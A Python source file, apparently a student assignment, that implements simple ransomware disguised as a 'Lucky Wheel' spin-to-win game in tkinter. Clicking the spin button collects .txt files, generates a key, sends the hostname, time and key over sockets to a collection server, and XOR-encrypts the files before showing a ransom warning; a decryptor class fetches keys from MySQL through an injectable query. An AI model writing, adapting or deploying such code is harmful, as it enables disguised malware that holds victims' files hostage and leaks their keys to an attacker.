from tkinter import *
import tkinter.font as font
from tkinter import messagebox
import queue
import os
import random
import socket
from datetime import datetime
import threading
from threading import Thread
from queue import Queue
import mysql.connector as mysql
from mysql.connector import Error
import pandas as pd
import os

class Encryption:
    def __init__(self):

        self.root=Tk()
        self.root.geometry('500x600+500+100')
        self.root.minsize(500,600)
        self.root.maxsize(500,600)
        self.root.title('Lucky Wheel')
        self.root.configure(bg='Sky blue')

        self.pic = PhotoImage(file='E:\Python Semester 2\Assignment\Ransom\Images\spin1.png')
        self.f1=font.Font(family='Serif',size='30')
        self.f2=font.Font(family='Serif',size='10')
        self.f3=font.Font(family='Serif',size='20')

        l = Label(self.root, image=self.pic)
        l.pack()

        main =Label(self.root,text='Spin the Lucky Wheel', bg='Gold',fg='Red')
        main['font']=self.f1
        main.place(relx='0.48',rely='0.1', anchor='center')

        convert=Button(self.root,text='-Spin To Win-',bg='red',fg='Gold',width=10, command=self.encryption)
        convert['font']=self.f2
        convert.place(relx='0.42',rely='0.9')

        # convert=Button(self.root,text='-Spin To Win-',bg='red',fg='Gold',width=10, command=Decryption)
        # convert['font']=self.f2
        # convert.place(relx='0.20',rely='0.7')

        self.root.mainloop()

    def encryption(self):
        self.encrypted_ext = ('.txt',)
        #files from machine
        self.file_paths = []
        for root, dirs, files in os.walk("E:\Python Semester 2\Assignment\Ransom\Test Files for encryption"):
            for file in files:
                file_path, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in self.encrypted_ext:
                    self.file_paths.append(root+'\\'+file)

        #generate key
        key = ''
        encryption_level = 512 // 8
        char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789<>?,./:;[]}{|'
        char_pool_len = len(char_pool)


        for i in range(encryption_level):
            key += char_pool[random.randint(0, char_pool_len-1)]

        hostname = os.getenv("COMPUTERNAME")

        # connect to server
        self.ip_address = socket.gethostbyname(hostname)
        self.port1 = 5666
        self.port2 = 5678
        self.port3 = 5679
        self.time = datetime.now()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.ip_address, self.port1))
                s.send(f'[{self.time}]'.encode('utf-8'))

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.ip_address, self.port2))
                s.send(f'{hostname}'.encode('utf-8'))

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.ip_address, self.port3))
                s.send(f'{key}'.encode('utf-8'))
            def encrypt(key):
                while q.not_empty:
                    file = q.get()
                    index = 0
                    max_index =len(key) - 1
                    try:
                        with open(file, 'rb') as f:
                            data = f.read()
                        with open(file,'w') as f:
                            f.write('')

                        for byte in data:
                            xor_byte = byte ^ ord(key[index])
                            with open(file, 'ab') as f:
                                f.write(xor_byte.to_bytes(1, 'little'))
                            if index >= max_index:
                                index = 0 
                            else: 
                                index += 1
                    except:
                        print(f"Failed to encrypt {file}")
                    q.task_done()
            q = Queue()
            for file in self.file_paths:
                q.put(file)

            for i in range(10):
                thread = threading.Thread(target=encrypt, args=(key,), daemon=True)
                thread.start()

            q.join()
            msg = messagebox.askquestion('Warning','All your files have been encrypted. Press Yes for decryption and No to quit the program.')
            if msg == 'yes':
                Decryption()
            else:
                self.root.destroy()
        except:
            msg = messagebox.showwarning('Sorry', 'Our servers are busy right again. Try again later.')

        return key
       
class Decryption:
    def __init__(self):
        root2=Toplevel()
        root2.geometry('500x600+500+100')
        root2.minsize(500,600)
        root2.maxsize(500,600)
        root2.title('Decryptor')

        self.photo = PhotoImage(file='E:\Python Semester 2\Assignment\Ransom\Images\Ransom1.png')

        self.f3=font.Font(family='Serif',size='20')

        l1 = Label(root2, image=self.photo)
        l1.image = self.photo
        l1.pack()

        num=StringVar()
        self.num_from=Entry(root2,width=40,textvariable= num,font=("Times New Roman", 16))
        self.num_from.place(relx='0.51',rely='0.65',anchor='center')

        convert=Button(root2,text='Decrypt',bg='#c8cfde', command=self.decryptor)
        convert['font']=self.f3

        convert.place(relx='0.40',rely='0.7')

        root2.mainloop()

    def database(self):
        self.empdata = pd.read_csv('E:\Python Semester 2\Assignment\Ransom\Key_Storage\encryptedhosts.csv', index_col=False, delimiter = ',')
        self.empdata.head()

        try:
            conn = mysql.connect(host='localhost', user='root', password='')
            if conn.is_connected():
                cursor = conn.cursor()
                cursor.execute("CREATE DATABASE ransom")
        except Error as e:
            pass

        try:
            conn = mysql.connect(host='localhost', database='ransom', user='root', password='')
            if conn.is_connected():
                cursor = conn.cursor()
                cursor.execute("select database();")
                record = cursor.fetchone()

                cursor.execute('DROP TABLE IF EXISTS ransom_info;')

                cursor.execute("CREATE TABLE ransom_info(time varchar(255),sys_name varchar(255),dec_key varchar(255))")

                for i,row in self.empdata.iterrows():
                    sql = "INSERT INTO ransom.ransom_info VALUES (%s,%s,%s)"
                    cursor.execute(sql, tuple(row))
                    conn.commit()

                hostname = os.getenv("COMPUTERNAME")

                cursor.execute(f"SELECT dec_key FROM `ransom_info` WHERE sys_name = '{hostname}'")
                self.result = cursor.fetchone()

            try:
                for self.keys2 in self.result:
                    self.keys3 = self.keys2
            except:
                pass

        except Error as e:
                    pass
        return self.keys3

    def decrypt(self, key):
        try: 
            if self.key == self.keys3: 
                while self.q.not_empty:
                    file = self.q.get()
                    index = 0
                    max_index = len(self.key) - 1
                    try:
                        with open(file, 'rb') as f:
                            data = f.read()
                        with open(file, 'w') as f:
                            f.write('')
                            for byte in data:
                                xor_byte = byte ^ ord(self.key[index])
                                with open(file, 'ab') as f:
                                    f.write(xor_byte.to_bytes(1, 'little'))
                                if index >= max_index:
                                    index = 0 
                                else: 
                                    index += 1
                        msg = 'Sucessfully Decrypted'
                        messagebox.showinfo('Info', msg)
                    except:
                        msg = 'Failed to decrypt.'
                    self.q.task_done()
                
                
            else:
                msg = 'Wrong decryption Key.'
                messagebox.showerror('Info', msg)
        except ValueError:
            msg = 'Wrong Decryption Key.'
            messagebox.showerror('Info', msg)
        
    def decryptor(self):
        self.database()
        self.key = self.num_from.get()
        encrypted_ext = ('.txt',)
        file_paths = []
        for root, dirs, files in os.walk("E:\Python Semester 2\Assignment"):
            for file in files:
                file_path, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in encrypted_ext:
                    file_paths.append(root+'\\'+file)

        self.q =queue.Queue()
        for file in file_paths:
            self.q.put(file)
        self.decrypt(self.key)
        self.q.join()

if __name__ == "__main__":
    Encryption()